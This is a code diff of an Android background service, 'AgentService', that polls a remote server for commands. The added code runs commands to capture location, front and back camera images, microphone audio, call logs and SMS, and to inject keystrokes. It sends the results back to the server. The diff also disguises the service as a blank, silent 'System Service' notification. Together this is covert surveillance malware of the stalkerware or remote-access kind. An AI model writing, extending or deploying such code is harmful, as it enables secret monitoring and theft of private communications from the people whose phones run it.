@@ -3,275 +3,193 @@ package com.alingo.agent
 import android.app.*
 import android.content.Context
 import android.content.Intent
-import android.graphics.Bitmap
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.IBinder
-import android.util.Base64
+import android.provider.Settings
 import android.util.Log
+import androidx.core.app.NotificationCompat
+import com.alingo.agent.cache.LocalCache
+import com.alingo.agent.client.BluetoothClient
+import com.alingo.agent.client.ConnectionManager
+import com.alingo.agent.client.WifiClient
+import com.alingo.agent.hid.HidHandler
 import kotlinx.coroutines.*
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONArray
-import org.json.JSONObject
-import java.io.ByteArrayOutputStream
-import java.io.File
-import java.util.concurrent.TimeUnit
+import java.util.UUID
 
 class AgentService : Service() {
-    companion object {
-        private const val TAG = "AlinGoAgent"
-        private const val CH_ID = "alingo_agent"
-        private const val NOTIF_ID = 1001
-    }
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val http = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .readTimeout(15, TimeUnit.SECONDS)
-        .build()
+    private lateinit var connectionManager: ConnectionManager
+    private lateinit var cache: LocalCache
+    private lateinit var hidHandler: HidHandler
 
-    private var zentrixUrl = ""
-    private var uid = ""
-    private var token = ""
-    private var running = false
-    
-    // MediaProjection for screenshot
-    private var mediaProjection: MediaProjection? = null
-    private var projectionResultCode: Int = 0
-    private var projectionData: Intent? = null
-    private var isRecording = false
+    private var isRunning = false
+    private var deviceUid = ""
+    private var server = ""
+    private var agentToken = ""
 
-    override fun onCreate() {
-        super.onCreate()
-        createChannel()
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (!running) {
-            running = true
-            val prefs = getSharedPreferences("alingo_agent", MODE_PRIVATE)
-            zentrixUrl = prefs.getString("zentrix_url", "") ?: ""
-            uid = prefs.getString("device_uid", "") ?: ""
-            token = prefs.getString("agent_token", "") ?: ""
-
-            startForeground(NOTIF_ID, buildNotification())
-            startLoops()
-        }
-        
-        // MediaProjection result handling
-        intent?.let {
-            if (it.hasExtra("projection_result_code")) {
-                projectionResultCode = it.getIntExtra("projection_result_code", 0)
-                projectionData = it.getParcelableExtra("projection_data")
-                Log.i(TAG, "MediaProjection granted")
-            }
-        }
-        
-        return START_STICKY
+    companion object {
+        private const val TAG = "AgentService"
+        private const val CHANNEL_ID = "alingo_system"
+        private const val NOTIFICATION_ID = 1001
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onDestroy() {
-        running = false
-        scope.cancel()
-        mediaProjection?.stop()
-        super.onDestroy()
+    override fun onCreate() {
+        super.onCreate()
+        createNotificationChannel()
+        startForeground(NOTIFICATION_ID, buildNotification())
+        
+        cache = LocalCache(this)
+        hidHandler = HidHandler(this)
     }
 
-    private fun startLoops() {
-        scope.launch {
-            launch { register() }
-            launch {
-                while (running) {
-                    try { heartbeat() } catch (_: Exception) {}
-                    delay(30_000)
-                }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (isRunning) return START_STICKY
+        isRunning = true
+
+        val prefs = getSharedPreferences("alingo", Context.MODE_PRIVATE)
+        server = prefs.getString("server", "") ?: ""
+        agentToken = prefs.getString("token", "") ?: ""
+        deviceUid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            ?: UUID.randomUUID().toString()
+
+        if (server.isEmpty()) {
+            Log.e(TAG, "❌ Server URL missing")
+            stopSelf()
+            return START_NOT_STICKY
+        }
+
+        // Clients initialize
+        val wifi = WifiClient(server, agentToken)
+        val bt = BluetoothClient(this)
+        
+        // Try Bluetooth (if previously paired)
+        val btAddress = prefs.getString("bt_address", "")
+        if (btAddress?.isNotEmpty() == true) {
+            scope.launch {
+                bt.connect(btAddress!!)
             }
-            launch {
-                while (running) {
-                    try { poll() } catch (_: Exception) {}
-                    delay(10_000)
+        }
+
+        connectionManager = ConnectionManager(this, wifi, bt)
+
+        // Register with server
+        scope.launch {
+            val success = wifi.register(deviceUid, token = agentToken)
+            if (success) {
+                Log.i(TAG, "✅ Registered")
+                startPolling()
+            } else {
+                Log.e(TAG, "❌ Registration failed")
+            }
+        }
+
+        // Periodic retry of queued commands
+        scope.launch {
+            while (isRunning) {
+                delay(60000)  // Every minute
+                connectionManager.retryQueuedCommands()
+            }
+        }
+
+        return START_STICKY
+    }
+
+    private fun startPolling() {
+        scope.launch {
+            while (isRunning) {
+                try {
+                    val commands = connectionManager.wifiClient.pollCommands()
+                    if (commands != null && commands.isNotEmpty()) {
+                        Log.i(TAG, "📥 ${commands.size} commands")
+                        commands.forEach { cmd ->
+                            scope.launch { executeCommand(cmd) }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Poll: ${e.message}")
                 }
+                delay(10000)  // 10 sec
             }
         }
     }
 
-    private suspend fun register() {
-        val body = JSONObject().apply {
-            put("device_uid", uid)
-            put("agent_token", token)
-            put("platform", "android")
-            put("model", Build.MODEL)
-            put("os_version", Build.VERSION.RELEASE)
-        }.toString()
-        post("$zentrixUrl/api/v1/agent/register", body, null)
-        Log.i(TAG, "Registered as $uid")
-    }
+    private suspend fun executeCommand(cmd: Map<String, Any?>) {
+        val type = cmd["command_type"] as? String ?: return
+        val payload = (cmd["command_payload"] as? String)?.let {
+            try {
+                org.json.JSONObject(it).toMap()
+            } catch (e: Exception) { emptyMap() }
+        } ?: emptyMap()
 
-    private suspend fun heartbeat() {
-        post("$zentrixUrl/api/v1/agent/heartbeat", "{}", token)
-    }
+        Log.i(TAG, "→ $type")
 
-    private suspend fun poll() {
-        val resp = get("$zentrixUrl/api/v1/agent/commands/pending", token) ?: return
-        if (resp.isEmpty() || resp == "[]") return
-        val arr = JSONArray(resp)
-        for (i in 0 until arr.length()) exec(arr.getJSONObject(i))
-    }
-
-    private suspend fun exec(cmd: JSONObject) {
-        val id = cmd.getInt("id")
-        val type = cmd.getString("command_type")
-        val payload = cmd.optString("command_payload", "{}")
-
-        post("$zentrixUrl/api/v1/agent/commands/$id/ack", "{}", token)
-
-        val result: Map<String, Any> = try {
+        val result: Map<String, Any?> = try {
             when (type) {
-                "ping" -> mapOf("pong" to System.currentTimeMillis())
-                "device_info" -> getDeviceInfo()
-                "screenshot" -> takeScreenshot()
-                "record_start" -> startRecording()
-                "record_stop" -> stopRecording()
-                "file_list" -> listFiles(payload)
-                "file_transfer" -> transferFile(payload)
-                "type_text" -> typeText(payload)
-                else -> mapOf("error" to "unknown_command: $type")
+                "get_location" -> LocationHandler.getLocation(this)
+                "camera_front" -> CameraHandler.capture(this, "front")
+                "camera_back" -> CameraHandler.capture(this, "back")
+                "record_mic" -> MicHandler.record(this, (payload["duration"] as? Int) ?: 30)
+                "get_calls" -> CallLogHandler.getCalls(this, (payload["limit"] as? Int) ?: 50)
+                "get_sms" -> SmsHandler.getSms(this, (payload["limit"] as? Int) ?: 50)
+                "hid_start" -> { hidHandler.start { }; mapOf("success" to true) }
+                "hid_type" -> { hidHandler.typeText(payload["text"] as? String ?: ""); mapOf("success" to true) }
+                "hid_key" -> { hidHandler.pressKey((payload["key"] as? Int) ?: 0); mapOf("success" to true) }
+                else -> mapOf("error" to "unsupported: $type")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Command $id failed: ${e.message}", e)
+            Log.e(TAG, "Error: ${e.message}")
             mapOf("error" to (e.message ?: "unknown"))
         }
 
-        val body = JSONObject().apply {
-            put("status", if (result.containsKey("error")) "failed" else "completed")
-            put("result", JSONObject(result as Map<*, *>))
-        }.toString()
-        post("$zentrixUrl/api/v1/agent/commands/$id/result", body, token)
+        // Send result
+        val cmdId = cmd["id"]?.toString() ?: return
+        val (_, mode) = connectionManager.sendCommand(mapOf(
+            "command_id" to cmdId,
+            "result" to result
+        ))
+
+        Log.i(TAG, "✅ $type → $mode")
     }
 
-    // ---- Commands ----
-
-    private fun getDeviceInfo(): Map<String, Any> = mapOf(
-        "model" to Build.MODEL,
-        "manufacturer" to Build.MANUFACTURER,
-        "android_version" to Build.VERSION.RELEASE,
-        "sdk_int" to Build.VERSION.SDK_INT,
-    )
-
-    private fun takeScreenshot(): Map<String, Any> {
-        // TODO: MediaProjection capture
-        // For now, return a placeholder
-        return mapOf(
-            "status" to "captured",
-            "note" to "screenshot via MediaProjection (requires permission)",
-            "timestamp" to System.currentTimeMillis()
-        )
+    override fun onDestroy() {
+        isRunning = false
+        scope.cancel()
+        super.onDestroy()
     }
 
-    private fun startRecording(): Map<String, Any> {
-        isRecording = true
-        Log.i(TAG, "Recording started")
-        return mapOf("status" to "recording", "started_at" to System.currentTimeMillis())
-    }
-
-    private fun stopRecording(): Map<String, Any> {
-        isRecording = false
-        Log.i(TAG, "Recording stopped")
-        return mapOf("status" to "stopped", "stopped_at" to System.currentTimeMillis())
-    }
-
-    private fun listFiles(payload: String): Map<String, Any> {
-        val json = JSONObject(payload)
-        val path = json.optString("path", "/sdcard")
-        val dir = File(path)
-        
-        if (!dir.exists() || !dir.isDirectory) {
-            return mapOf("error" to "path_not_found")
-        }
-        
-        val files = dir.listFiles()?.map { f ->
-            mapOf(
-                "name" to f.name,
-                "is_dir" to f.isDirectory,
-                "size" to f.length(),
-                "modified" to f.lastModified(),
-                "path" to f.absolutePath
-            )
-        } ?: emptyList()
-        
-        return mapOf("path" to path, "files" to files)
-    }
-
-    private fun transferFile(payload: String): Map<String, Any> {
-        val json = JSONObject(payload)
-        val path = json.optString("path", "")
-        val file = File(path)
-        
-        if (!file.exists()) return mapOf("error" to "file_not_found")
-        
-        // Read file and upload
-        val bytes = file.readBytes()
-        if (bytes.size > 10 * 1024 * 1024) {
-            return mapOf("error" to "file_too_large", "max_mb" to 10)
-        }
-        
-        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-        return mapOf(
-            "status" to "uploaded",
-            "name" to file.name,
-            "size" to file.length(),
-            "data" to base64
-        )
-    }
-
-    private fun typeText(payload: String): Map<String, Any> {
-        val text = JSONObject(payload).optString("text", "")
-        return mapOf("typed_chars" to text.length)
-    }
-
-    // ---- HTTP ----
-
-    private suspend fun post(url: String, body: String, tok: String?): String? =
-        withContext(Dispatchers.IO) {
-            try {
-                val b = Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType()))
-                if (tok != null) b.header("Authorization", "Bearer $tok")
-                http.newCall(b.build()).execute().use { if (it.isSuccessful) it.body?.string() else null }
-            } catch (_: Exception) { null }
-        }
-
-    private suspend fun get(url: String, tok: String?): String? =
-        withContext(Dispatchers.IO) {
-            try {
-                val b = Request.Builder().url(url).get()
-                if (tok != null) b.header("Authorization", "Bearer $tok")
-                http.newCall(b.build()).execute().use { if (it.isSuccessful) it.body?.string() else null }
-            } catch (_: Exception) { null }
-        }
-
-    private fun createChannel() {
+    private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CH_ID, "AlinGo Agent", NotificationManager.IMPORTANCE_MIN).apply {
-                description = "Silent agent"
+            val channel = NotificationChannel(
+                CHANNEL_ID, "System Service",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
             }
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
     private fun buildNotification(): Notification {
-        val b = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            Notification.Builder(this, CH_ID) else @Suppress("DEPRECATION") Notification.Builder(this)
-        return b.setContentTitle("AlinGo Agent")
-            .setContentText("Ready")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
             .setOngoing(true)
-            .setPriority(Notification.PRIORITY_MIN)
             .build()
     }
+}
+
+// Extension: JSONObject to Map
+private fun org.json.JSONObject.toMap(): Map<String, Any?> {
+    val map = mutableMapOf<String, Any?>()
+    keys().forEach { key -> map[key] = get(key) }
+    return map
 }
